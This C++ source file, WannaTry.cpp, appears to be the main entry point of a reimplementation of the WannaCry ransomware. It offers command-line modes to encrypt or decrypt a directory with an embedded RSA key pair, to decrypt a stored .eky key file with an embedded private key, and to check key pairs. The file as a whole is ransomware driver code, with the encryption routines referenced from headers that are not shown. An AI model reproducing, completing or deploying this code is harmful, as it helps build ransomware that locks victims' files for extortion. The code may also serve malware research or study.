// WannaTry.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <tchar.h>
#include <ShlObj.h>
#include "../Common/common.h"
#include "../Common/ezfile.h"
#include "WanaEnCryptor.h"
#include "WanaDecryptor.h"
#include "WanaProc.h"
#include "../EZCrypt/Keys.h"

BOOL DecryptLocalEKY(DWORD nKeyNo)
{
	TCHAR BasePath[MAX_PATH];
	TCHAR szEKYFile[MAX_PATH];
	TCHAR szDKYFile[MAX_PATH];
	UCHAR aEKYBuffer[4096];
	UCHAR aDKYBuffer[4096];
	ULONG cbEKYBuffer = 0;
	ULONG cbDKYBuffer = 0;
	ULONG cbResult;
	BOOL bResult = FALSE;
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		BasePath);
	_tcscat_s(BasePath, MAX_PATH,
		_T("\\"));
	_tcscat_s(BasePath, MAX_PATH,
		BASE_DIRNAME);
	_stprintf_s(szEKYFile, MAX_PATH,
		_T("%s\\%08x.eky"), BasePath, nKeyNo);
	_stprintf_s(szDKYFile, MAX_PATH,
		_T("%s\\%08x.dky"), BasePath, nKeyNo);
	DEBUG("Read %s\n", szEKYFile);
	if (!ReadBuffer(
		szEKYFile,
		{ 0 },
		0,
		aEKYBuffer,
		sizeof(aEKYBuffer),
		&cbEKYBuffer)) {
		DEBUG("Read %s fails: %d\n",
			szEKYFile, GetLastError());
		return FALSE;
	}
	DEBUG("Decrypt\n");
	PEZRSA pDecRSA = new EZRSA();
	pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		WannaPrivateKey,
		WannaPrivateKeySize());
	bResult = pDecRSA->Decrypt(
		(PUCHAR)aEKYBuffer,
		cbEKYBuffer,
		aDKYBuffer,
		sizeof(aDKYBuffer),
		&cbDKYBuffer);
	if (!bResult) {
		DEBUG("Decrypt fails\n");
		return FALSE;
	}
	delete pDecRSA;
	DEBUG("Write %s\n", szDKYFile);
	if (!WriteBuffer(
		szDKYFile,
		{ 0 },
		0,
		aDKYBuffer,
		cbDKYBuffer,
		&cbResult)) {
		DEBUG("Write %s fails: %d\n",
			szDKYFile, GetLastError());
		return FALSE;
	}
	return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc < 2) {
		_ftprintf(stderr, _T("Usage:\n"));
		_ftprintf(stderr, _T("DecryptEKY\n"));
		_ftprintf(stderr, _T("Encrypt DIR\n"));
		_ftprintf(stderr, _T("Decrypt DIR\n"));
		_ftprintf(stderr, _T("CheckKeyPair PublicFile PrivateFile\n"));
	}
	else if (!_tcsicmp(argv[1], _T("DecryptEKY"))) {
		DecryptLocalEKY(0);
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Encrypt")) && argc > 2) {
		PWanaCryptor pCryptor =
			new WanaCryptor(
				WannaPublicKey,
				WannaPublicKeySize());
		pCryptor->Encrypt(argv[2]);
		delete pCryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Decrypt")) && argc > 2) {
		PWanaDecryptor pDecryptor = new WanaDecryptor();
		pDecryptor->Decrypt(argv[2]);
		delete pDecryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("CheckKeyPair"))) {
		TCHAR BasePath[MAX_PATH];
		TCHAR szPKYFile[MAX_PATH];
		TCHAR szDKYFile[MAX_PATH];
		HRESULT result = SHGetFolderPath(
			NULL,
			CSIDL_PERSONAL,
			NULL,
			SHGFP_TYPE_CURRENT,
			BasePath);
		_tcscat_s(BasePath, MAX_PATH,
			_T("\\"));
		_tcscat_s(BasePath, MAX_PATH,
			BASE_DIRNAME);
		if (argc > 2 && *argv[2] != _T('-')) {
			_tcscpy_s(szPKYFile, argv[2]);
		}
		else {
			_stprintf_s(szPKYFile, MAX_PATH,
				_T("%s\\%08x.pky"), BasePath, 0);
		}
		if (argc > 3 && *argv[3] != _T('-')) {
			_tcscpy_s(szDKYFile, argv[3]);
		}
		else {
			_stprintf_s(szDKYFile, MAX_PATH,
				_T("%s\\%08x.dky"), BasePath, 0);
		}
		BOOL bResult = RSAFileMatch(
			szPKYFile,
			szDKYFile);
		_tprintf(_T("return: %d\n"), bResult);
		return 0;
	}
	else {
		_tprintf(_T("unknown: %s\n"), argv[1]);
		return 1;
	}
	return 0;
}

